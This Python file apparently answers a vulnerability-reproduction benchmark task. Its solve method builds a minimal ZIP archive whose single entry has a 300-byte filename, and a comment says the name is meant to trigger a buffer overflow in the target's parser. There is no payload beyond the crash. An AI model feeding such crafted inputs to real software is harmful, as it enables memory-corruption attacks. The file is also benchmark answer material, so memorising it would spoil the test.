import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        def create_zip_with_long_filename(filename: bytes, data: bytes) -> bytes:
            # Local file header
            local_sig = 0x04034B50
            version_needed = 20
            flags = 0
            compression_method = 0  # store
            mod_time = 0
            mod_date = 0
            crc32 = 0
            comp_size = len(data)
            uncomp_size = len(data)
            fname_len = len(filename)
            extra_len = 0

            local_header = struct.pack(
                "<IHHHHHIIIHH",
                local_sig,
                version_needed,
                flags,
                compression_method,
                mod_time,
                mod_date,
                crc32,
                comp_size,
                uncomp_size,
                fname_len,
                extra_len,
            )

            local_offset = 0
            local_part = local_header + filename + data

            # Central directory
            central_sig = 0x02014B50
            version_made_by = 20
            disk_start = 0
            internal_attr = 0
            external_attr = 0
            rel_offset = local_offset
            comment_len = 0
            central_header = struct.pack(
                "<IHHHHHHIIIHHHHHII",
                central_sig,
                version_made_by,
                version_needed,
                flags,
                compression_method,
                mod_time,
                mod_date,
                crc32,
                comp_size,
                uncomp_size,
                fname_len,
                extra_len,
                comment_len,
                disk_start,
                internal_attr,
                external_attr,
                rel_offset,
            )
            central_dir = central_header + filename

            # EOCD
            eocd_sig = 0x06054B50
            disk_no = 0
            cd_start_disk = 0
            total_entries_disk = 1
            total_entries = 1
            cd_size = len(central_dir)
            cd_offset = len(local_part)
            zip_comment_len = 0

            eocd = struct.pack(
                "<IHHHHIIH",
                eocd_sig,
                disk_no,
                cd_start_disk,
                total_entries_disk,
                total_entries,
                cd_size,
                cd_offset,
                zip_comment_len,
            )

            return local_part + central_dir + eocd

        # Create a filename longer than 256 bytes to trigger the overflow
        long_name_len = 300
        filename = b"A" * long_name_len
        data = b""

        return create_zip_with_long_filename(filename, data)